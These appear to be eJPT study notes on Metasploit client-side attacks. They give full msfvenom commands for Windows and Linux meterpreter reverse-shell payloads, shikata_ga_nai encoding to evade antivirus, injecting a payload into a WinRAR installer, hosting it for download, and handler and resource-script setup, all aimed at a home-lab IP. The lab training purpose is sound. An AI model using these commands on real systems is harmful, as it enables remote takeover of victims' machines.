# Client-Side Attacks

## ​[Client-Side Attacks](https://www.offsec.com/metasploit-unleashed/client-side-attacks/) with MSF <a href="#client-side-attacks-with-msf" id="client-side-attacks-with-msf"></a>

A **client-side attack** is a security breach that happens on the client side.

* Social engineering techniques take advantage of human vulnerabilities
* Require user-interaction to open malicious documents or portable executables (**`PEs`**)
* The payload is stored on the client's system
* Attackers have to pay attention to Anti Virus detection

> ❗ _**Advanced modern antivirus solutions detects and blocks this type of payloads very easily.**_

### ​[Msfvenom](https://www.offsec.com/metasploit-unleashed/msfvenom/) Payloads <a href="#msfvenom-payloads" id="msfvenom-payloads"></a>

> ​[**`msfvenom`**](https://www.kali.org/tools/metasploit-framework/#msfvenom) - a Metasploit standalone payload generator and encoder
>
> * **`e.g.`** - generate a malicious meterpreter payload, transfer it to a client target; once executed it will connect back to the payload handler and provides with remote access

* List available payloads

msfvenom --list payloads

* When generating a payload the exact name of the payload must be specified
  * target operating system
  * target O.S. architecture (x64, x86 ...)
  * payload type
  * protocol used to connect back (depends on requirements)

**`e.g.`** of **Staged payload**

<figure><img src="https://2946054920-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-8374500896fdbc9698dcf904ca377f5d0d9a4158%2Fimage-20230415190726950.png?alt=media" alt=""><figcaption></figcaption></figure>

* `windows/x64/meterpreter/reverse_tcp`

**`e.g.`** of **Non-Staged payload**

* `windows/x64/meterpreter_reverse_https`

<figure><img src="https://2946054920-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-034cc3f4b42408fe6a3e0fb23ba7a745fa9482de%2Fimage-20230415191239575.png?alt=media" alt=""><figcaption></figcaption></figure>

* Generate a Windows payload with `msfvenom`

**32bit payload:**msfvenom -a x86 -p windows/meterpreter/reverse\_tcp LHOST=192.168.31.128 LPORT=1234 -f exe > /home/kali/certs/ejpt/Windows\_Payloads/payloadx86.exe​# LHOST = Attacker IP address**64bit payload:**msfvenom -a x64 -p windows/x64/meterpreter/reverse\_tcp LHOST=192.168.31.128 LPORT=1234 -f exe > /home/kali/certs/ejpt/Windows\_Payloads/payloadx64.exe

* List the output formats available

msfvenom --list formatsFramework Executable Formats \[--format \<value>]===============================================Name----aspaspxaspx-exeaxis2dllducky-script-pshelfelf-soexeexe-onlyexe-serviceexe-smallhta-pshjarjsploop-vbsmachomsimsi-nouacosx-apppshpsh-cmdpsh-netpsh-reflectionpython-reflectionvbavba-exevba-pshvbswar​Framework Transform Formats \[--format \<value>]==============================================Name----base32base64bashccsharpdwdwordgogolanghexjavajs\_bejs\_lenimnimlangnumperlplpowershellps1pypythonrawrbrubyrustrustlangshvbapplicationvbscript

* Generate a Linux payload with `msfvenom`

**32bit payload:**msfvenom -p linux/x86/meterpreter/reverse\_tcp LHOST=192.168.31.128 LPORT=1234 -f elf > /home/kali/certs/ejpt/Linux\_Payloads/payloadx86**64bit payload:**msfvenom -p linux/x64/meterpreter/reverse\_tcp LHOST=192.168.31.128 LPORT=1234 -f elf > /home/kali/certs/ejpt/Linux\_Payloads/payloadx64

* 📌 _Platform and architecture are auto selected if not specified, based on the selected payload_

The transferring method onto the target system depends on the type of the social engineering technique.

<figure><img src="https://2946054920-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-5623729fc9d37d7c64ce35442c390f254debe1be%2Fimage-20230415192514206.png?alt=media" alt=""><figcaption></figcaption></figure>

* **`e.g.`** A simple web server can be set up on the attacker system to serve the payload files and a handler to receive the connection back from the target system

cd /home/kali/certs/ejpt/Windows\_Payloadssudo python -m http.server 8080

* To deal with a `meterpreter` payload, an appropriate listener is necessary to handle the reverse connection, the `multi/handler` Metasploit module in this case

msfconsole -quse multi/handlerset payload windows/meterpreter/reverse\_tcpset LHOST 192.168.31.128set LPORT 1234run

* Download the payload on the Windows 2008 system (in this case my home lab VM) from this link
  * `http://192.168.31.128:8080`
  * Run the `payloadx86.exe` payload on the target
* The `meterpreter` session on the attacker machine should be opened

Same example with the `linux/x86/meterpreter/reverse_tcp` Linux payload executed on the Kali VM.![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-a0dc06e0faab6ffdd48000e41ed434b71b6f763a%2Fimage-20230415201253314.png?alt=media)

<figure><img src="https://2946054920-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-ad022854e3f7b468ce17822415bef326f1f4c84e%2Fimage-20230415200856110.png?alt=media" alt=""><figcaption></figcaption></figure>

#### Encoding Payloads <a href="#encoding-payloads" id="encoding-payloads"></a>

Signature based Antivirus solutions can detect malicious files or executables. Older AV solutions can be evaded by **encoding** the payloads.

* ❗ _This kind of attack vector is outdated and hardly used today_.
* May work on legacy old O.S. like Windows 7 or older.

🗒️ Payload **Encoding** involves changing the payload shellcode _with the aim of changing the payload signature_.

* ​[Encoding will not always avoid detection](https://docs.rapid7.com/metasploit/encoded-payloads-bypassing-anti-virus)​

🗒️ **Shellcode** is the code typically used as a _payload_ for exploitation, that provides with a remote _command shell_ on the target system.msfvenom --list encodersmsfvenom --list encoders

<figure><img src="https://2946054920-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-36c58ce623edb6604b5389a560b43c2b2889540f%2Fimage-20230415212307184.png?alt=media" alt=""><figcaption></figcaption></figure>

* Excellent encoders are **`cmd/powershell_base64`** and **`x86/shikata_ga_nai`**

### **Windows Payload**

* Generate a Win x86 payload and encode it with `shikata_ga_nai`:

msfvenom -p windows/meterpreter/reverse\_tcp LHOST=192.168.31.128 LPORT=1234 -e x86/shikata\_ga\_nai -f exe > /home/kali/certs/ejpt/Windows\_Payloads/encodedx86.exemsfvenom shikata\_ga\_nai Win

<figure><img src="https://2946054920-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-d56db5d41d93664e9db09e119cb88f61f33c9b3b%2Fimage-20230415213830109.png?alt=media" alt=""><figcaption></figcaption></figure>

* The payload can be encoded as often as desired by increasing the number of iterations.
* The more iterations, the better chances to bypass an Antivirus. Use **`-i`** option.

msfvenom -p windows/meterpreter/reverse\_tcp LHOST=192.168.31.128 LPORT=1234 -i 10 -e x86/shikata\_ga\_nai -f exe > /home/kali/certs/ejpt/Windows\_Payloads/encodedx86.exe

<figure><img src="https://2946054920-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-9c008a977f1b16aded3166fa2f353eba24310ff4%2Fimage-20230415213941131.png?alt=media" alt=""><figcaption></figcaption></figure>

### **Linux Payload**

msfvenom -p linux/x86/meterpreter/reverse\_tcp LHOST=192.168.31.128 LPORT=1234 -i 10 -e x86/shikata\_ga\_nai -f elf > /home/kali/certs/ejpt/Linux\_Payloads/encodedx86msfvenom shikata\_ga\_nai Linux

<figure><img src="https://2946054920-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-e2cc12efa4f115212a607b3c46a2996a9eedb3bc%2Fimage-20230415213215234.png?alt=media" alt=""><figcaption></figcaption></figure>

* Test each of the above generated payloads, like before

cd /home/kali/certs/ejpt/Windows\_Payloadssudo python -m http.server 8080msfconsole -q​use multi/handlerset payload windows/meterpreter/reverse\_tcpset LHOST 192.168.31.128set LPORT 1234run

<figure><img src="https://2946054920-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-272cfba18c7588efaa8b7563881176e593a4fd82%2Fimage-20230415213745031.png?alt=media" alt=""><figcaption></figcaption></figure>

> 📌 Modern antivirus detects and blocks the encoded payload as soon as the download is started:​​

<figure><img src="https://2946054920-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-0a77cc42fa547ba68f55942bb166da905d8fe024%2Fimage-20230415214414552.png?alt=media" alt=""><figcaption></figcaption></figure>

### Injecting Payloads into PEs <a href="#injecting-payloads-into-pes" id="injecting-payloads-into-pes"></a>

🗒️ [Windows **Portable Executable**](https://blog.syselement.com/ine/courses/ejpt/hostnetwork-penetration-testing/3-metasploit) (**PE**) _is a file format for executables, object code, DLLs and others, used in 32-bit and 64-bit Windows O.S._

* Download a portable executable, **`e.g.`** [WinRAR](https://www.win-rar.com/download.html)​
* Payloads can be injected into PEs with `msfvenom` with the **`-x`** and **`-k`** options

msfvenom -p windows/meterpreter/reverse\_tcp LHOST=192.168.31.128 LPORT=1234 -e x86/shikata\_ga\_nai -i 10 -f exe -x winrar-x32-621.exe > /home/kali/certs/ejpt/Windows\_Payloads/winrar.execd /home/kali/certs/ejpt/Windows\_Payloadssudo python -m http.server 8080msfconsole -q​use multi/handlerset payload windows/meterpreter/reverse\_tcpset LHOST 192.168.31.128set LPORT 1234run

<figure><img src="https://2946054920-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-27de7cdb23d59739b4d177f1a32ddc74780573ed%2Fimage-20230415220833685.png?alt=media" alt=""><figcaption></figcaption></figure>

* Transfer and run the `winrar.exe` file to the target O.S.
* File description is kept, but not its functionality.

<figure><img src="https://2946054920-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-c416cf444412c992defadf09a24f6adeb9401aac%2Fimage-20230415221016113.png?alt=media" alt=""><figcaption></figcaption></figure>

* Proceed with the Post Exploitation module to migrate the process into another one, in the `meterpreter` session

run post/windows/manage/migrate

<figure><img src="https://2946054920-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-ca9eef2a7b72ca09defdcf07d701d4dc667061cc%2Fimage-20230415221432202.png?alt=media" alt=""><figcaption></figcaption></figure>

## Automation with [Resource Scripts](https://www.offsec.com/metasploit-unleashed/writing-meterpreter-scripts/)​ <a href="#automation-with-resource-scripts" id="automation-with-resource-scripts"></a>

Repetitive tasks and commands can be automated using **MSF resource scripts** (same as batch scripts).

* Almost every MSF command can be automated.

ls -al /usr/share/metasploit-framework/scripts/resource/usr/share/metasploit-framework/scripts/resource**`e.g. 1`**

<figure><img src="https://2946054920-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-95ab3be68e60afb06d3824d9869156fdfb649c9f%2Fimage-20230415222643575.png?alt=media" alt=""><figcaption></figcaption></figure>

* _Automate the process of setting up a handler for the generated payloads_, by creating a new `handler.rc` file

nano handler.rc​# Insert the following lines# by specifying the commands sequentially​use multi/handlerset payload windows/meterpreter/reverse\_tcpset LHOST 192.168.31.128set LPORT 1234run​# Save it and exit

* Load and run the recourse script in `msfconsole`

msfconsole -q -r handler.rcmsfconsole -q -r handler.rc**`e.g. 2`**nano portscan.rc​# Insert the following lines# by specifying the commands sequentially​use auxiliary/scanner/portscan/tcpset RHOSTS 192.168.31.131run​# Save it and exitmsfconsole -q -r portscan.rcmsfconsole -q -r portscan.rc**`e.g. 3`**nano db\_status.rc​db\_statusworkspaceworkspace -a TESTmsfconsole -q -r db\_status.rc

<figure><img src="https://2946054920-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-30a5d2563c243b3bef81b0835eaaf7aed1fdc488%2Fimage-20230415224235665.png?alt=media" alt=""><figcaption></figcaption></figure>

<figure><img src="https://2946054920-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-9652fb3f7d34700f46ff906b184ad1c2111707ce%2Fimage-20230415223936432.png?alt=media" alt=""><figcaption></figcaption></figure>

<figure><img src="https://2946054920-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-dbf1e139c5e8f0aa6fbddec7ff86e88719e8dd05%2Fimage-20230415223258567.png?alt=media" alt=""><figcaption></figcaption></figure>

* 📌 Load up a resource script from within the `msfconsole` with the **`resource`** command

resource /home/kali/certs/ejpt/resource\_scripts/handler.rc

* Typed in commands in a new `msfconsole` session, can be exported in a new resource script

makerc /home/kali/certs/ejpt/resource\_scripts/portscan2.rc

<figure><img src="https://2946054920-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-6c31f9fe42cbe2502e56f60c7a96efd34cd3dee5%2Fimage-20230415224836969.png?alt=media" alt=""><figcaption></figcaption></figure>
